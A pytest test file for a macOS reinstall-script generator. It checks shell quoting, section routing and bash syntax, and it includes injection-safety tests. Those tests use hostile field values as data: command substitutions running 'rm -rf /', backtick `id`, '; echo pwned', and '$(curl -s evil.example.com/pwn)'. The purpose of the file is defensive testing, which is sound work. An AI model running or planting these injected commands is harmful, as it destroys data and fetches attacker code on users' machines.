"""Tests for maccat.reinstall.emitter — locks emitter rendering correctness and injection-safety.

Covers: per-renderer unit tests, section routing, full-script integration,
bash -n syntax validation, and adversarial injection safety.
"""
from __future__ import annotations

import os
import shlex
import shutil
import subprocess
import tempfile

import pytest

from maccat.reinstall.emitter import (
    SECTION_SOURCE_MAP,
    emit_reinstall_script,
    quote_for_script,
    safe_comment_value,
)
from maccat.reinstall.parser import ParsedCatalog, ParsedItem, ParsedSection

# ---------------------------------------------------------------------------
# Test helpers and factories
# ---------------------------------------------------------------------------


def assert_bash_n_clean(script: str) -> None:
    """Assert the script string passes bash -n syntax check. Skip if bash absent."""
    if not shutil.which("bash"):
        pytest.skip("bash not available")
    with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as f:
        f.write(script)
        tmp = f.name
    try:
        result = subprocess.run(["bash", "-n", tmp], capture_output=True, text=True)
        assert result.returncode == 0, f"bash -n failed:\n{result.stderr}"
    finally:
        os.unlink(tmp)


def _make_item(name: str, version: str | None = None, id_: str | None = None) -> ParsedItem:
    """Build a ParsedItem without calling parse_catalog()."""
    return ParsedItem(name=name, version=version, id=id_, raw_line=name)


def _make_section(
    title: str, items: list[ParsedItem], degraded: bool = False
) -> ParsedSection:
    """Build a ParsedSection without calling parse_catalog()."""
    return ParsedSection(title=title, items=items, degraded=degraded)


def _make_catalog(*sections: ParsedSection) -> ParsedCatalog:
    """Build a ParsedCatalog without calling parse_catalog()."""
    return ParsedCatalog(sections=list(sections))


# ---------------------------------------------------------------------------
# Parametrize data tables
# ---------------------------------------------------------------------------

# (name, version, expected_guard_fragment, expected_comment_fragment_or_None)
# NOTE: shlex.quote("git") == "git" (no quotes for safe identifiers);
#       shlex.quote("My Package") == "'My Package'" (spaces require quoting).
BREW_CASES = [
    ("git", "2.44.0", "brew install git", "# cataloged: 2.44.0"),
    ("git", None, "brew install git", None),
    ("My Package", "1.0", "brew install 'My Package'", "# cataloged: 1.0"),
    ("python@3.11", "3.11.1 3.11.2", "brew install python@3.11", "# cataloged: 3.11.1 3.11.2"),
]

# (name, version, id_, expect_mas_install, expect_in_checklist)
MAS_CASES = [
    ("Final Cut Pro", "10.7.1", "424389933", True, False),
    ("Old App", "1.0", None, False, True),
]

# (title, item_id, item_version, editor, expected_cmd_fragment)
EXT_CASES = [
    (
        "VS Code Extensions",
        "MS-Python.Python",
        "2024.1.0",
        "code",
        "code --install-extension 'ms-python.python'",
    ),
    (
        "Cursor Extensions",
        "ms-python.python",
        "2024.1.0",
        "cursor",
        "cursor --install-extension 'ms-python.python'",
    ),
]

# Adversarial catalog name inputs and their expected quoting
ADVERSARIAL_CASES = [
    # name with command substitution
    "evil $(rm -rf /)",
    # name with backticks
    "`id`",
    # name with semicolons
    "foo; echo pwned",
    # name with spaces
    "foo bar baz",
    # name with single-quote
    "it's a test",
]


# ---------------------------------------------------------------------------
# Test classes
# ---------------------------------------------------------------------------


class TestInjectionHelpers:
    """Unit tests for quote_for_script and safe_comment_value."""

    def test_quote_safe_identifier_unchanged(self) -> None:
        """A simple safe identifier is not wrapped in quotes."""
        assert quote_for_script("git") == "git"

    def test_quote_spaces_trigger_quoting(self) -> None:
        """A name with spaces is wrapped in single-quotes."""
        assert quote_for_script("My App") == "'My App'"

    def test_quote_command_substitution_neutralized(self) -> None:
        """Command substitution metacharacters are inside single-quotes."""
        result = quote_for_script("$(rm -rf /)")
        # shlex.quote wraps the whole value in single-quotes
        assert result.startswith("'"), f"Expected single-quote wrap, got {result!r}"
        assert result.endswith("'"), f"Expected single-quote wrap, got {result!r}"
        # The value inside the quotes is the literal string — safe
        assert result == "'$(rm -rf /)'"

    def test_safe_comment_newline_replaced(self) -> None:
        """Embedded newlines are replaced with a space."""
        assert safe_comment_value("foo\nbar") == "foo bar"

    def test_safe_comment_carriage_return_replaced(self) -> None:
        """Embedded carriage returns are replaced with a space."""
        assert safe_comment_value("foo\rbar") == "foo bar"

    def test_safe_comment_clean_value_unchanged(self) -> None:
        """A clean value passes through unchanged."""
        assert safe_comment_value("clean value") == "clean value"


class TestBrewBlock:
    """Unit tests for the Homebrew section renderer."""

    def test_simple_item_guard_and_comment(self) -> None:
        """Simple item with version emits guard and # cataloged: comment."""
        section = _make_section("Homebrew Packages", [_make_item("git", "2.44.0")])
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        # shlex.quote("git") == "git" (no quotes needed for safe identifiers)
        assert "brew list git" in script, f"brew list missing in {script!r}"
        assert "brew install git" in script, f"brew install missing in {script!r}"
        assert "# cataloged: 2.44.0" in script, f"version comment missing in {script!r}"

    def test_item_no_version_no_comment(self) -> None:
        """Item without version: guard line present, no # cataloged: suffix."""
        section = _make_section("Homebrew Packages", [_make_item("git")])
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "brew install git" in script
        assert "# cataloged:" not in script

    def test_item_with_spaces_single_quoted(self) -> None:
        """Item name with spaces is wrapped in single-quotes in the guard."""
        section = _make_section("Homebrew Packages", [_make_item("My Package", "1.0")])
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "brew install 'My Package'" in script

    def test_multi_version_verbatim_in_comment(self) -> None:
        """Multi-version string appears verbatim in # cataloged: comment."""
        section = _make_section("Homebrew Packages", [_make_item("python@3.11", "3.11.1 3.11.2")])
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "# cataloged: 3.11.1 3.11.2" in script

    def test_section_top_note_present(self) -> None:
        """Section top contains the formula/cask ambiguity NOTE comment."""
        section = _make_section("Homebrew Packages", [_make_item("git", "2.44.0")])
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "# NOTE:" in script and ("formula" in script or "cask" in script)

    @pytest.mark.parametrize("name,version,guard_frag,comment_frag", BREW_CASES)
    def test_brew_guard_shape(
        self,
        name: str,
        version: str | None,
        guard_frag: str,
        comment_frag: str | None,
    ) -> None:
        """Universal guard shape: brew list ... || brew list --cask ... || brew install ..."""
        section = _make_section("Homebrew Packages", [_make_item(name, version)])
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert guard_frag in script, f"Guard fragment {guard_frag!r} missing in script"
        # Check overall guard structure exists
        assert "&>/dev/null || brew list --cask" in script
        if comment_frag:
            assert comment_frag in script, f"Comment {comment_frag!r} missing"
        else:
            assert "# cataloged:" not in script


class TestMasBlock:
    """Unit tests for the App Store Applications renderer."""

    def test_item_with_id_emits_mas_install(self) -> None:
        """Item with id emits mas install <id>."""
        section = _make_section(
            "App Store Applications",
            [_make_item("Final Cut Pro", "10.7.1", id_="424389933")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        # shlex.quote("424389933") == "424389933" (safe numeric string, no quoting needed)
        assert "mas install 424389933" in script

    def test_item_without_id_no_mas_install(self) -> None:
        """Item without id: NO 'mas install' line; item appears in echo checklist."""
        section = _make_section(
            "App Store Applications",
            [_make_item("Old App", "1.0")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "mas install" not in script
        assert "Old App" in script

    def test_mixed_section_auto_items_first_then_manual(self) -> None:
        """Mixed section: auto items first, id-less items under 'no ID' heading."""
        section = _make_section(
            "App Store Applications",
            [
                _make_item("Final Cut Pro", "10.7.1", id_="424389933"),
                _make_item("Old App", "1.0"),
            ],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        # Auto install first (shlex.quote("424389933") == "424389933" — no wrapping needed)
        auto_pos = script.find("mas install 424389933")
        # Manual heading after
        manual_pos = script.find("no ID")
        assert auto_pos != -1, "mas install line missing"
        assert manual_pos != -1, "no ID heading missing"
        assert auto_pos < manual_pos, "auto items should appear before manual heading"


class TestEditorExtBlock:
    """Unit tests for the VS Code / Cursor extension renderer."""

    def test_vscode_id_lowercased_and_uses_code(self) -> None:
        """VS Code section with mixed-case id: emitted line uses 'code', id is lowercased."""
        section = _make_section(
            "VS Code Extensions",
            [_make_item("Python", "2024.1.0", id_="MS-Python.Python")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        # shlex.quote("ms-python.python") == "ms-python.python" (safe, no quoting needed)
        assert "code --install-extension ms-python.python" in script
        assert "MS-Python.Python" not in script  # uppercase form must not appear

    def test_cursor_section_uses_cursor(self) -> None:
        """Cursor section uses 'cursor' throughout."""
        section = _make_section(
            "Cursor Extensions",
            [_make_item("Python", "2024.1.0", id_="ms-python.python")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        # shlex.quote("ms-python.python") == "ms-python.python" (safe, no quoting needed)
        assert "cursor --install-extension ms-python.python" in script

    def test_command_guard_shape(self) -> None:
        """Command guard shape: command -v code >/dev/null && ... grep -qi ... --install-extension."""  # noqa: E501
        section = _make_section(
            "VS Code Extensions",
            [_make_item("Python", "2024.1.0", id_="ms-python.python")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "command -v code >/dev/null &&" in script
        assert "grep -qi" in script
        assert "--install-extension" in script

    def test_grep_pattern_lowercased(self) -> None:
        """Grep pattern uses lowercased id: '^ms-python.python$' (quoted)."""
        section = _make_section(
            "VS Code Extensions",
            [_make_item("Python", "2024.1.0", id_="MS-Python.Python")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        # The grep pattern is shlex.quote("^ms-python.python$")
        expected_pat = shlex.quote("^ms-python.python$")
        assert expected_pat in script, f"grep pattern {expected_pat!r} missing in script"

    def test_extension_with_version_has_comment(self) -> None:
        """Extension with version: '# cataloged: {version}' appended."""
        section = _make_section(
            "VS Code Extensions",
            [_make_item("Python", "2024.1.0", id_="ms-python.python")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "# cataloged: 2024.1.0" in script

    def test_extension_without_id_falls_back_to_echo(self) -> None:
        """Extension with id=None: echo fallback (no install command)."""
        section = _make_section(
            "VS Code Extensions",
            [_make_item("Unknown Extension", "1.0.0")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "--install-extension" not in script
        assert "Unknown Extension" in script


class TestManualChecklistBlock:
    """Unit tests for the manual checklist renderer."""

    def test_setapp_section_has_heading_and_items(self) -> None:
        """Section titled 'Setapp Applications' emits echo heading then echo per item."""
        section = _make_section(
            "Setapp Applications",
            [_make_item("CleanMyMac X", "22.0.0")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "Setapp Applications:" in script
        assert "CleanMyMac X" in script

    def test_item_with_version_format(self) -> None:
        """Item with version: echo '  - AppName (1.0.0)'."""
        section = _make_section(
            "Setapp Applications",
            [_make_item("AppName", "1.0.0")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "  - AppName (1.0.0)" in script

    def test_item_without_version_format(self) -> None:
        """Item without version: echo '  - AppName' (no parentheses)."""
        section = _make_section(
            "Setapp Applications",
            [_make_item("AppName")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "  - AppName" in script
        # No parentheses for version-less item
        assert "  - AppName (" not in script


class TestSectionRouting:
    """Unit tests for section routing via SECTION_SOURCE_MAP."""

    def test_unknown_title_routes_to_manual_checklist(self) -> None:
        """Unknown title 'Future Source' routes to manual checklist (not auto-install)."""
        section = _make_section(
            "Future Source",
            [_make_item("SomeTool", "1.0")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "Future Source:" in script
        assert "SomeTool" in script
        # Should NOT have brew/mas/code/cursor auto-install for unknown sections
        assert "brew install" not in script
        assert "mas install" not in script
        assert "--install-extension" not in script

    def test_degraded_section_skipped_entirely(self) -> None:
        """Degraded section produces no output."""
        degraded = _make_section("Homebrew Packages", [], degraded=True)
        healthy = _make_section(
            "App Store Applications",
            [_make_item("FinalCut", "10.0", id_="424389933")],
        )
        catalog = _make_catalog(degraded, healthy)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "brew" not in script
        assert "mas install" in script

    def test_empty_section_skipped_entirely(self) -> None:
        """Empty section (items=[], degraded=False) produces no output."""
        empty = _make_section("Homebrew Packages", [])
        healthy = _make_section(
            "App Store Applications",
            [_make_item("FinalCut", "10.0", id_="424389933")],
        )
        catalog = _make_catalog(empty, healthy)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "brew" not in script
        assert "mas install" in script

    def test_installed_mac_software_list_header_skipped(self) -> None:
        """'Installed Mac Software List' empty header section is silently skipped (WR-05)."""
        header = _make_section("Installed Mac Software List", [])
        brew = _make_section("Homebrew Packages", [_make_item("git", "2.44.0")])
        catalog = _make_catalog(header, brew)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        # Header title must not appear as a section heading
        assert "Installed Mac Software List:" not in script
        # Brew section should still be present (shlex.quote("git") == "git")
        assert "brew install git" in script

    @pytest.mark.parametrize(
        "title",
        [
            "Google Chrome Extensions",
            "Claude Code MCP Servers",
            "Setapp Applications",
            "Firefox Extensions",
            "Web-installed Applications",
            "Claude Code Plugins",
            "Claude Code Skills & Agents",
            "Codex MCP Servers",
            "Gemini CLI Extensions",
            "Gemini CLI MCP Servers",
            "OpenCode Plugins",
            "OpenCode MCP Servers",
            "OpenCode Agents",
        ],
    )
    def test_known_manual_titles_never_trigger_auto_install(self, title: str) -> None:
        """All known manual-checklist titles route to checklist, not auto-install."""
        assert title not in SECTION_SOURCE_MAP, (
            f"{title!r} should not be in SECTION_SOURCE_MAP (manual-checklist only)"
        )
        section = _make_section(title, [_make_item("SomeTool", "1.0")])
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "brew install" not in script, f"brew install appeared for {title!r}"
        assert "mas install" not in script, f"mas install appeared for {title!r}"
        assert "--install-extension" not in script, f"--install-extension for {title!r}"


class TestEmitReinstallScript:
    """Integration tests for emit_reinstall_script() on multi-section catalogs."""

    def _make_full_catalog(self) -> ParsedCatalog:
        """Build a representative multi-section catalog."""
        return _make_catalog(
            _make_section("Installed Mac Software List", []),
            _make_section("Homebrew Packages", [_make_item("git", "2.44.0")]),
            _make_section(
                "App Store Applications",
                [_make_item("Final Cut Pro", "10.7.1", id_="424389933")],
            ),
            _make_section(
                "VS Code Extensions",
                [_make_item("Python", "2024.1.0", id_="ms-python.python")],
            ),
            _make_section(
                "Cursor Extensions",
                [_make_item("Python", "2024.1.0", id_="ms-python.python")],
            ),
            _make_section(
                "Setapp Applications",
                [_make_item("CleanMyMac", "22.0.0")],
            ),
        )

    def test_script_starts_with_shebang(self) -> None:
        """Script starts with '#!/usr/bin/env bash'."""
        script = emit_reinstall_script(
            self._make_full_catalog(), source_name="test.txt", generated="2026-06-16"
        )
        assert script.startswith("#!/usr/bin/env bash\n"), f"Wrong start: {script[:40]!r}"

    def test_set_errexit_on_second_line(self) -> None:
        """Line after shebang is 'set -Eeuo pipefail'."""
        script = emit_reinstall_script(
            self._make_full_catalog(), source_name="test.txt", generated="2026-06-16"
        )
        lines = script.split("\n")
        assert lines[1] == "set -Eeuo pipefail", f"line 2: {lines[1]!r}"

    def test_provenance_contains_source_name(self) -> None:
        """Script contains source_name in the provenance comment block."""
        script = emit_reinstall_script(
            self._make_full_catalog(),
            source_name="my-catalog.txt",
            generated="2026-06-16",
        )
        assert "my-catalog.txt" in script

    def test_provenance_contains_generated_date(self) -> None:
        """Script contains generated date in the provenance comment block."""
        script = emit_reinstall_script(
            self._make_full_catalog(), source_name="test.txt", generated="2026-06-16"
        )
        assert "2026-06-16" in script

    def test_provenance_contains_review_notice(self) -> None:
        """Script contains 'review' (case-insensitive) in the provenance block."""
        script = emit_reinstall_script(
            self._make_full_catalog(), source_name="test.txt", generated="2026-06-16"
        )
        assert "review" in script.lower()

    def test_section_ordering(self) -> None:
        """Ordering: Homebrew before mas, mas before code, code before cursor, manual last."""
        script = emit_reinstall_script(
            self._make_full_catalog(), source_name="test.txt", generated="2026-06-16"
        )
        brew_pos = script.find("brew install")
        mas_pos = script.find("mas install")
        code_pos = script.find("code --install-extension")
        cursor_pos = script.find("cursor --install-extension")
        manual_pos = script.find("=== Manual Checklist ===")
        assert brew_pos < mas_pos, "Homebrew must precede mas"
        assert mas_pos < code_pos, "mas must precede VS Code"
        assert code_pos < cursor_pos, "VS Code must precede Cursor"
        assert cursor_pos < manual_pos, "Cursor must precede manual checklist"

    def test_no_manual_checklist_section_when_none(self) -> None:
        """Catalog with only a Homebrew section: no '=== Manual Checklist ===' emitted."""
        catalog = _make_catalog(
            _make_section("Homebrew Packages", [_make_item("git", "2.44.0")])
        )
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert "=== Manual Checklist ===" not in script


class TestBashNClean:
    """Tests that the emitted script passes bash -n syntax check."""

    def test_representative_catalog_bash_n_clean(self) -> None:
        """A representative full catalog passes bash -n."""
        catalog = _make_catalog(
            _make_section("Installed Mac Software List", []),
            _make_section(
                "Homebrew Packages",
                [
                    _make_item("git", "2.44.0"),
                    _make_item("python@3.11", "3.11.1 3.11.2"),
                    _make_item("node", None),
                ],
            ),
            _make_section(
                "App Store Applications",
                [
                    _make_item("Final Cut Pro", "10.7.1", id_="424389933"),
                    _make_item("Old App", "1.0"),
                ],
            ),
            _make_section(
                "VS Code Extensions",
                [_make_item("Python", "2024.1.0", id_="ms-python.python")],
            ),
            _make_section(
                "Cursor Extensions",
                [_make_item("Python", "2024.1.0", id_="ms-python.python")],
            ),
            _make_section(
                "Setapp Applications",
                [_make_item("CleanMyMac X", "22.0.0")],
            ),
            _make_section(
                "Google Chrome Extensions",
                [_make_item("uBlock Origin", "1.57.0", id_="cjpalhdlnbpafiamejdnhcphjbkeiagm")],
            ),
        )
        script = emit_reinstall_script(
            catalog, source_name="test-catalog.txt", generated="2026-06-16"
        )
        assert_bash_n_clean(script)


class TestAdversarialInjection:
    """Tests that catalog values with shell metacharacters are safely neutralized."""

    # Hostile input values
    _HOSTILE_NAME = "evil $(rm -rf /) `id`; echo pwned"
    _HOSTILE_VERSION = "1.0\nrm -rf /"

    def test_brew_hostile_name_bash_n_clean(self) -> None:
        """Homebrew item with hostile name: bash -n passes."""
        section = _make_section(
            "Homebrew Packages",
            [_make_item(self._HOSTILE_NAME, self._HOSTILE_VERSION)],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert_bash_n_clean(script)

    def test_brew_hostile_name_neutralized(self) -> None:
        """Dangerous metacharacters are wrapped inside single-quotes (neutralized)."""
        section = _make_section(
            "Homebrew Packages",
            [_make_item(self._HOSTILE_NAME, self._HOSTILE_VERSION)],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        # shlex.quote wraps the hostile name in single-quotes — the exact quoted form
        # must appear in the script (not a bare unquoted version)
        quoted_name = shlex.quote(self._HOSTILE_NAME)
        assert quoted_name in script, (
            f"Hostile name {self._HOSTILE_NAME!r} not shlex-quoted in script"
        )
        # The hostile version embedded newline is stripped — "rm -rf /" appears only in the
        # # cataloged: comment context (after safe_comment_value strips the newline)
        # It must NOT appear as an unquoted bare command on its own line
        lines = script.split("\n")
        for line in lines:
            stripped = line.strip()
            # A bare "rm -rf /" or "rm -rf" command would be a line that IS exactly that
            # or starts with it without being inside quotes or a comment
            if stripped == "rm -rf /" or stripped.startswith("rm -rf /"):
                raise AssertionError(
                    f"Bare 'rm -rf /' appeared as a live command line: {line!r}"
                )
        # Also verify the version appears neutralized in the comment
        assert "# cataloged: 1.0 rm -rf /" in script, (
            "Expected version with newline-stripped to appear in # cataloged: comment"
        )

    def test_vscode_hostile_id_bash_n_clean(self) -> None:
        """VS Code extension with hostile id: bash -n passes."""
        section = _make_section(
            "VS Code Extensions",
            [_make_item("evil ext", None, id_="$(curl -s evil.example.com/pwn)")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert_bash_n_clean(script)

    def test_vscode_hostile_id_single_quoted(self) -> None:
        """VS Code extension with hostile id: the id is inside single-quotes."""
        hostile_id = "$(curl -s evil.example.com/pwn)"
        section = _make_section(
            "VS Code Extensions",
            [_make_item("evil ext", None, id_=hostile_id)],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        # The lowercased id should be shlex-quoted
        quoted = shlex.quote(hostile_id.lower())
        assert quoted in script, f"Hostile id {hostile_id!r} not shlex-quoted in script"

    def test_manual_checklist_backtick_name_bash_n_clean(self) -> None:
        """Manual checklist section with backtick in name: bash -n passes."""
        section = _make_section(
            "Setapp Applications",
            [_make_item("`id` evil", "1.0")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert_bash_n_clean(script)

    @pytest.mark.parametrize("hostile_name", ADVERSARIAL_CASES)
    def test_parametrized_adversarial_brew_bash_n(self, hostile_name: str) -> None:
        """Parametrized adversarial brew names: all pass bash -n."""
        section = _make_section(
            "Homebrew Packages",
            [_make_item(hostile_name, "1.0")],
        )
        catalog = _make_catalog(section)
        script = emit_reinstall_script(catalog, source_name="test.txt", generated="2026-06-16")
        assert_bash_n_clean(script)
